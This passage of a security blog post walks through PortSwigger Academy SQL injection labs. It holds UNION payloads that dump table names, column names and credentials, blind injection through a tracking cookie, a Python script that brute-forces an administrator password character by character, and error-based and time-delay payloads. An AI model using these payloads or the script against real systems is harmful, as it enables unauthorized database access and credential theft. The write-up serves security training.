<code class="language-plaintext highlighter-rouge">'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code></p><p>Now, we select the table that contain the word users, in my case is <code class="language-plaintext highlighter-rouge">users_mumqoo</code> and dump the column names with this payload <code class="language-plaintext highlighter-rouge">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns WHERE table_name='users_mumqoo'----</code></p><p>In my case the column names are <code class="language-plaintext highlighter-rouge">password_lhjzlx</code> and <code class="language-plaintext highlighter-rouge">username_ngcpuh</code>.</p><p>Finally we can retrieve the username and password because we know the column name and the table name, we will use this payload <code class="language-plaintext highlighter-rouge">'+UNION+SELECT+username_ngcpuh, password_lhjzlx+FROM users_mumqoo--</code></p><p>The final query will look something like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">PRODUCTS</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gifts'</span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">username_ngcpuh</span><span class="p">,</span> <span class="n">password_lhjzlx</span> <span class="k">FROM</span> <span class="n">users_mumqoo</span><span class="c1">--</span>
</pre></table></code></div></div><h2 id="lab-10---sql-injection-attack-listing-the-database-contents-on-oracle"><span class="mr-2">Lab 10 - SQL injection attack, listing the database contents on Oracle</span><a href="#lab-10---sql-injection-attack-listing-the-database-contents-on-oracle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab, we will use the same idea as the previous one, only now the database is oracle, so first read the <a href="https://docs.oracle.com/cd/E19078-01/mysql/mysql-refman-5.0/information-schema.html#tables-table">Documentation</a> about the information schema, first we must list the tables with the payload: <code class="language-plaintext highlighter-rouge">'UNION SELECT NULL, table_name FROM all_tables--</code></p><p>After identifying the user table, which in my case is <code class="language-plaintext highlighter-rouge">USERS_GACPLX</code>, we must identify the names of the columns, for that we use the following payload:<code class="language-plaintext highlighter-rouge">'UNION SELECT NULL, column_name FROM USER_TAB_COLUMNS WHERE table_name='USERS_GACPLX'--</code></p><p>With this we will identify the user and password columns, in my case they are <code class="language-plaintext highlighter-rouge">USERNAME_PIOHJJ</code>, <code class="language-plaintext highlighter-rouge">PASSWORD_ZELMBN</code> , once we know that we only make the query of the credentials knowing the name of the table, with the following payload final: <code class="language-plaintext highlighter-rouge">'UNION SELECT USERNAME_PIOHJJ, PASSWORD_ZELMBN FROM USERS_GACPLX--</code></p><p>And the final query will look something like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">PRODUCTS</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gifts'</span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">USERNAME_PIOHJJ</span><span class="p">,</span> <span class="n">PASSWORD_ZELMBN</span> <span class="k">FROM</span> <span class="n">USERS_GACPLX</span><span class="c1">--</span>
</pre></table></code></div></div><h2 id="lab-11---blind-sql-injection-with-conditional-responses"><span class="mr-2">Lab 11 - Blind SQL injection with conditional responses</span><a href="#lab-11---blind-sql-injection-with-conditional-responses" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab we have to use the cookie to make sql injection, we intercept the request with burp and we use the substring command to compare the characters of the password of the users table of the user with administrator name, this command receives 3 values, the variable, the start order and the number of characters to extract and that is equal to any letter, if the query is true then we will get the welcome back message, otherwise not, then we can make a brute force attack in burpsuite.</p><p>The query will look something like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">tracking</span><span class="o">-</span><span class="n">id</span> <span class="k">from</span> <span class="n">tracking</span><span class="o">-</span><span class="k">table</span> <span class="k">where</span> <span class="n">TrackingId</span><span class="o">=</span><span class="s1">'g1cLmHM7hZM7IhBH'</span> <span class="k">and</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="p">)</span><span class="o">=</span><span class="s1">'c'</span><span class="c1">--</span>
</pre></table></code></div></div><p>The response have the text welcome back <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli11.jpg" alt="" data-proofer-ignore></p><p>We use the cluster bomb attack for 2 parameters, the index of the initial position of the substring command and the character with which it is compared, for that we click on add in burpsuite and then configure the payloads for each parameter. The response have the text welcome back <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli12.jpg" alt="" data-proofer-ignore></p><p>The first parameter consists of indices from 1 to 20 going from 1 to 1, the length of the password is known because we previously compared the lenght of the password with different values.</p><p>For example: <code class="language-plaintext highlighter-rouge">(select password form users where username='administrator' and LENGTH(password)&gt;19)='administrator'--</code> <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli13.jpg" alt="" data-proofer-ignore></p><p>The second parameter is the character itself with which each letter of the password is compared, so it must contain the alphabet values and numbers. <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli14.jpg" alt="" data-proofer-ignore></p><p>Then we click start attack!!</p><p>If you have burpsuite community edition it will take some time because it has to make 720 requests, after finishing we order by size and relate each position with its respective letter and we will get the administrator’s password.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli15.jpg" alt="" data-proofer-ignore></p><p>Finally we order the position with its respective letter and we get the administrator’s password</p><h3 id="lab-11---python-script"><span class="mr-2">Lab 11 - Python Script</span><a href="#lab-11---python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This script will allow us to brute force the password, just change the session cookies for yours and it will do the job for you.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="kn">import</span> <span class="n">urllib</span>

<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">https://127.0.0.1:8080</span><span class="sh">'</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">sqli_password</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">password_extracted</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">21</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">126</span><span class="p">):</span>
            <span class="n">sqli_payload</span> <span class="o">=</span> <span class="sh">"'</span><span class="s"> and (select ascii(substring(password,%s,1)) from users where username=</span><span class="sh">'</span><span class="s">administrator</span><span class="sh">'</span><span class="s">)=</span><span class="sh">'</span><span class="s">%s</span><span class="sh">'</span><span class="s">--</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
            <span class="n">sqli_payload_encoded</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">quote</span><span class="p">(</span><span class="n">sqli_payload</span><span class="p">)</span>
            <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">TrackingId</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">g1cLmHM7hZM7IhBH</span><span class="sh">'</span> <span class="o">+</span> <span class="n">sqli_payload_encoded</span><span class="p">,</span> <span class="sh">'</span><span class="s">session</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">t8y3Fw72A2oY8vxzu3o6CyjaBnplydVD</span><span class="sh">'</span><span class="p">}</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
            <span class="k">if</span> <span class="sh">"</span><span class="s">Welcome</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="se">\r</span><span class="sh">'</span> <span class="o">+</span> <span class="n">password_extracted</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">password_extracted</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="se">\r</span><span class="sh">'</span> <span class="o">+</span> <span class="n">password_extracted</span><span class="p">)</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
                <span class="k">break</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">(+) Usage: %s &lt;url&gt;</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">(+) Example: %s www.example.com</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">(+) Retrieving administrator password...</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sqli_password</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="lab-12---blind-sql-injection-with-conditional-errors"><span class="mr-2">Lab 12 - Blind SQL injection with conditional errors</span><a href="#lab-12---blind-sql-injection-with-conditional-errors" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This lab contains a <a href="https://portswigger.net/web-security/sql-injection/blind">blind SQL injection</a> vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.</p><p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.</p><p>The database contains a different table called <code class="language-plaintext highlighter-rouge">users</code>, with columns called <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code>. You need to exploit the blind <a href="https://portswigger.net/web-security/sql-injection">SQL injection</a> vulnerability to find out the password of the <code class="language-plaintext highlighter-rouge">administrator</code> user.</p><p>We will use this payload <code class="language-plaintext highlighter-rouge">TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></p><p>Continue this process testing offset 3, 4, and so on, until you have the whole password, we can use the last script but changing the sql_payload, if you have burpsuite professional it will take less time.</p><h2 id="lab-13---blind-sql-injection-with-time-delays"><span class="mr-2">Lab 13 - Blind SQL injection with time delays</span><a href="#lab-13---blind-sql-injection-with-time-delays" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This lab contains a <a href="https://portswigger.net/web-security/sql-injection/blind">blind SQL injection</a> vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.</p><p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.</p><p>Modify the <code class="language-plaintext highlighter-rouge">TrackingId</code> cookie, changing it to:</p><p><code class="language-plaintext highlighter-rouge">TrackingId=x'||pg_sleep(10)--</code></p><p>Submit the request and observe that the application takes 10 seconds to respond.</p><h2 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy - SQL Injection</a><li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP Top 10 - SQL Injection</a><li><a href="https://www.amazon.com/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities-ebook/dp/B08YK368Y3">Bug Bounty Bootcamp</a><li><a href="https://www.youtube.com/c/RanaKhalil101">Rana Khalil Channel</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-security/'>Web Security</a>, <a href='/categories/portswigger-academy/'>Portswigger Academy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web-security/" class="post-tag no-text-decoration" >web security</a> <a href="/tags/labs/" class="post-tag no-text-decoration" >labs</a> <a href="/tags/owasp/" class="post-tag no-text-decoration" >owasp</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SQL+Injection+-+Labs+-+s4yhii%27s+Blog&url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FSQL-Injection-Labs%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SQL+Injection+-+Labs+-+s4yhii%27s+Blog&u=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FSQL-Injection-Labs%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FSQL-Injection-Labs%2F&text=SQL+Injection+-+Labs+-+s4yhii%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tickets-popcorn-please/">Tickets and Popcorn please!, The Day main.js Became the Key Vault</a><li><a href="/posts/CyberApocalypse-CTF2025-Web/">Cyber Apocalypse 2025 - 6x Web Challenges Writeup</a><li><a href="/posts/CyberApocalypse-CTF2024-Web/">Cyber Apocalypse 2024 - 4x Web Challenges Writeup</a><li><a href="/posts/Web-Cache-Poisoning/">Web Cache Poisoning Techniques</a><li><a href="/posts/HTB-Cyber-Apocalypse-CTF-Web-Writeups/">Cyber Apocalypse 2023 2x Web Challenges Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/OS-Command-Injection-Labs/"><div class="card-body"> <em class="small" data-ts="1654876800" data-df="ll" > Jun 10, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Os Command Injection Labs</h3><div class="text-muted small"><p> OS command injection allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its ...</p></div></div></a></div><div class="card"> <a href="/posts/SQL-Injection/"><div class="card-body"> <em class="small" data-ts="1643126400" data-df="ll" > Jan 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SQL Injection</h3><div class="text-muted small"><p> A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement. This happens when the inp...</p></div></div></a></div><div class="card"> <a href="/posts/Broken-Authentication-Labs/"><div class="card-body"> <em class="small" data-ts="1647360000" data-df="ll" > Mar 15, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Broken Authentication Labs</h3><div class="text-muted small"><p> Vulnerabilities in password-based login Username enumeration via different responses With Burp running, investigate the login page and submit an invalid username and password. In Burp, go to P...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SQL-Injection/" class="btn btn-outline-primary" prompt="Older"><p>SQL Injection</p></a> <a href="/posts/Docker-Cheatsheet/" class="btn btn-outline-primary" prompt="Newer"><p>Docker Cheatsheet</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "s4yhii/s4yhii.github.io", "data-repo-id": "R_kgDOHtsc-g", "data-category": "Announcements", "data-category-id": "DIC_kwDOHtsc-s4CQh10", "data-mapping": "title", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2026 <a href="https://twitter.com/s4yhii">Jesus Lujan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-V0V53P7YVQ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-V0V53P7YVQ'); }); </script>
